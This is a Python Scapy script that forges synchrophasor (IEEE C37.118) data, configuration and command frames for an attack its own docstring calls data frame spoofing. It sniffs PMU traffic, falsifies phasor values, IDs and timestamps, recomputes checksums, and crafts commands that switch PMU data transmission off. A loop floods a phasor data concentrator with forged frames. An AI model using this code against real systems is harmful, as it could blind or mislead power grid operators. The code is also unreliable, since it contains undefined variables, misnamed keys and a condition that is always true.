#! /usr/bin/env python

from scapy.all import *
import time
import sys
import binascii
import crc16
from datetime import datetime as dt

# use raw packet to send packet with a loopback interface
# comment if not using with the loopback interface
#conf.L3socket = L3RawSocket


def compute_crc(hex_string):
	crc = crc16.crc16xmodem(binascii.unhexlify(hex_string), 0xffff)
	return format(crc & 0xffff,'04x').decode('hex')

def get_frame_type(TCP_diagram):
	# determin if current UDP_diagram is a command frame
	# examing the load of the UDP_diagram
	pkt = TCP_diagram
	# look for the thrid word of the synchronization word (the heading two bytes of the synchronization word
	# if the word has decimal value of 0, 3, 4, the corresponding frame is a data, configuration, and command frame, respectively.
	load = pkt.load.encode("HEX") #load is a string
	# get the second third synchronization word
    	if load[:2]!='aa':
		return "NON_SYNCHROPHASOR"
	if load[2]=='0':
		return 'DATA_FRAME'
	if load[2]=='3':
		return 'CONFIG_FRAME'
	if load[2]=='4':
		return 'COMMAND_FRAME'


def decimal2bytelist(num):
	return list(str(bytearray([num/256,num%256])))


# load packets capture
def generate_config_frame(original, config_content):
	'''works only for the configuration frame containing on config data for 1 PMU
	   the PMU has only 1 phasor, 0 analog, 0 status words
	'''

	if get_frame_type(original)!='CONFIG_FRAME':
		print 'Original Frame not a CONFIG_FRAME'

	forged_load =  list(original.load)

	# change Frame Size (2nd byte in the load)
	if 'frame_size' in config_content:
		forged_load[2:4] = decimal2bytelist(config_content['frame_size'])

	# change PMU ID
	if 'receiver_ID' in config_content:
		forged_load[4:6] = decimal2bytelist(config_content['ID'])

	# change number of PMU
	if 'num_PMU_blocks' in config_content:
		forged_load[18:20] = decimal2bytelist(config_content['num_PMU_blocks'])

	# change station name:
	if 'station_name':
		forged_load[20:36] = list(config_content['station_name'])

	if 'PMU_ID' in config_content:
		forget_load[36:38] = decimal2bytelist(config_content['PMU_ID'])

	# change the data format
	if 'data_format' in config_content:
		forged_load[39] = config_content['data_format']

	# change number of phasors
	if 'num_phasor' in config_content:
		forged_load[40:42] = decimal2bytelist(config_content['num_phasor'])

	# change number of analog values
	if 'num_analog' in config_content:
		forged_load[42:44] = decimal2bytelist(config_content['num_analog'])

	# change number of digital status words
	if 'num_digital_status_words' in config_content:
		forged_load[44:46] = decimal2bytelist(config_content['num_digital_status_words'])

	# change phasor name
	if 'phasor_names' in config_content:
		for phasor_name in config_content['phasor_name']:
			forged_load[46:62] = list(phasor_name)

	# change phasor conversation factors
	if 'phasor_conv_factors' in config_content:
		for factor in config_content['phasor_conv_factors']:
			forged_load[62:66]
		forged_load[62:66] = decimal2bytelist(config_content['phasor_conv_factor'])

def generate_data_frame(original, phasor, freq_deviation, rate_of_change, ID=1):
	"""phasor is a list of 4 bytes, eg: ['\xff', '\xc3', '\x00', '\x52']"""
	"""freq_deviation is a list of 2 bytes, eg: ['\x00','\xc9']"""

	if get_frame_type(original[TCP])!='DATA_FRAME':
		print 'Original Frame is not a DATA_FRAME'

	load = list(original.load)
	print len(original.load)
	# change PMU ID
	load[4:6] = decimal2bytelist(ID)
	# generate and substitute false generated data
	for i in xrange(0, len(phasor)/4):
		load[16+i*4:20+i*4] = phasor[i*4:i*4+4]

	#load[len(phasor)+16:len(phasor)+18] = freq_deviation
	#load[len(phasor)+18:len(phasor)+20] = rate_of_change
	#load[20:22] = freq_deviation
	#load[22:24] = rate_of_change


	# change time stamp
	current_time = int(time.time())
	hex_current_time = hex(current_time)[2:]
	print hex_current_time
	for i in xrange(len(hex_current_time)/2):
		load[6+i]=hex_current_time[i*2:i*2+2].decode('hex')
	load[-2:] = compute_crc("".join(load[:-2]).encode('hex'))
	# recalcuate the checksum
	return "".join(load)


def change_data_time(original):
	"""phasor is a list of 4 bytes, eg: ['\xff', '\xc3', '\x00', '\x52']"""
	"""freq_deviation is a list of 2 bytes, eg: ['\x00','\xc9']"""


	load = list(original.load)
	# change time stamp
	current_time = int(time.time())
	hex_current_time = hex(current_time+1)[2:]
	print current_time
	for i in xrange(len(hex_current_time)/2):
		load[6+i]=hex_current_time[i*2:i*2+2].decode('hex')
	load[-2:] = compute_crc("".join(load[:-2]).encode('hex'))
	# recalcuate the checksum
	del original[Raw]

	return original/Raw("".join(load))


def change_command_time(original, PMU_ID):
	"""phasor is a list of 4 bytes, eg: ['\xff', '\xc3', '\x00', '\x52']"""
	"""freq_deviation is a list of 2 bytes, eg: ['\x00','\xc9']"""


	load = list(original.load)

	load[4:6] = PMU_ID
	# change time stamp
	current_time = int(time.time())
	hex_current_time = hex(current_time)[2:]
	print hex_current_time
	for i in xrange(len(hex_current_time)/2):
		load[-12+i]=hex_current_time[i*2:i*2+2].decode('hex')

	# recalculate the checksum of the command frame
	load[-2:] = compute_crc("".join(load[:-2]).encode('hex'))

	return "".join(load)

def generate_command_frame(original, TYPE, sport=0, dport=0):
	if get_frame_type(original[TCP])!='COMMAND_FRAME':
		print 'Original Frame is not a COMMOND_FRAME'
		return

	'''original is the captured original packet'''
	'''param ONOFF: true for ON, false for OFF'''
	# build the payload of of the command frame based upon the load of the original packet
	original_load = original.load

	# two places to change:
	# 1. change the 4th and 3r last byte of the load of a command frame. (the last byte is the checksum)
	# 0001 indicates off, 0002 indicates on.

	# 2. also need to change the time stamp if the PMU also checks the that for validity
	crafted_payload = original_load
	crafted_payload_list = list(crafted_payload)
	crafted_payload_list[-3]
	if TYPE == 'ON':
		crafted_payload_list[-3]='\x02' # turn on the data transmission
	elif TYPE == 'OFF':
		crafted_payload_list[-3]='\x01' # turn off the data transmission
	elif TYPE == 'CFG-2':
		crafted_payload_list[-3]='\x05' # request config-2

	# change the timestamp
	current_time = int(time.time())
	hex_current_time = hex(current_time)[2:]
	print hex_current_time
	for i in xrange(len(hex_current_time)/2):
		crafted_payload_list[-12+i]=hex_current_time[i*2:i*2+2].decode('hex')

	# recalculate the checksum of the command frame
	crafted_payload_list[-2:] = compute_crc("".join(crafted_payload_list[:-2]).encode('hex'))

	crafted_payload= "".join(crafted_payload_list)

	# change the destination port if dport is set
	if dport!=0:
		crafted_pkt.dport = dport
	if sport!=0:
		crafted_pkt.sport = sport

	# recalculate the checksum of the crafted packet
	#del(crafted_pkt[UDP].chksum)
	#crafted_pkt.show2()

	return crafted_payload

def usage_collection():
	"""Collects all the codes that accomplishes a data frame spoofing attack"""

	# sniff packet at a interface as appropriate
	# TODO make the sniffer more intelligent: stop once all three kind of packets are obtained
	live_packets = sniff(iface='lo')

	# find the first command frame in the live_packets
	command_original = ""
	for pkt in live_packets:
		if get_frame_type(pkt)=='COMMAND_FRAME':
			command_original=pkt
			break

	# find the first data frame
	data_original = ""
	for pkt in live_packets:
		if get_frame_type(pkt)=='DATA_FRAME':
			data_original=pkt
			break

	# find the first configuration frame
	config_original = ""
	for pkt in live_packets:
		if get_frame_type(pkt)=='CONFIG_FRAME':
			config_original=pkt
			break


def inject_forged_data_frame(data_frame_original,):
	while True:
		send(IP(dst='127.0.0.1')/UDP(sport=PMU_server_port,dport=PDC_server_port)/Raw(generate_data_frame(data_frame_original,list('00000000'.decode('hex')),list('00c9'.decode('hex')),list('0002'.decode('hex')),2)))
	time.sleep(0.02)

def remove_redunt(pkts):

	load = list(pkts.load)
	load[2] = '\x00'
	load[3] = '\x48'
	del load[-22:-6] # delete redunt phasor
	load[-2:] = list('0000'.decode('hex')) #digital words
	load.append(compute_crc("".join(load).encode('hex')))# recalcuate the checksum

	del pkts[Raw]
	return pkts/Raw("".join(load))


def fill_list(l, n, val):
    for i in xrange(1, n+1):
    	for j in xrange(0, len(val)):
        	l.append(val[j])
